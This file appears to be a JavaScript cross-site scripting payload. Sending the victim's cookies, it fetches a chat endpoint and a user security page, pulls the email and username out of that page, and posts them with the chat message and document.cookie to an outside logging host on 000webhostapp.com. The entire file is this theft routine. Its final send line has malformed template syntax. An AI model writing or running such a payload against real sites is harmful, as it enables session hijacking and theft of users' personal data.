var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", "/chat/check");
xhr.onreadystatechange = () => {
    if (xhr.readyState == 4) {

       var message=xhr.responseText
        xhr.open("GET", "/user/security");
        xhr.onreadystatechange = () => {
            if (xhr.readyState == 4) {
                const parser = new DOMParser();
                var dom = parser.parseFromString(xhr.responseText, "text/html")
try{
                var email = dom.getElementById("email").value;
                var username = dom.getElementById("username").value;
}catch(e){}
                xhr.open("POST","https://test-vul.000webhostapp.com/log.php");

xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");

xhr.send(email=${email}&username=${username}&message=${message}&cookie=${document.cookie});
xhr.onreadystatechange=()=>{
}
            
}
        }
        xhr.send()
    }
}
xhr.send()
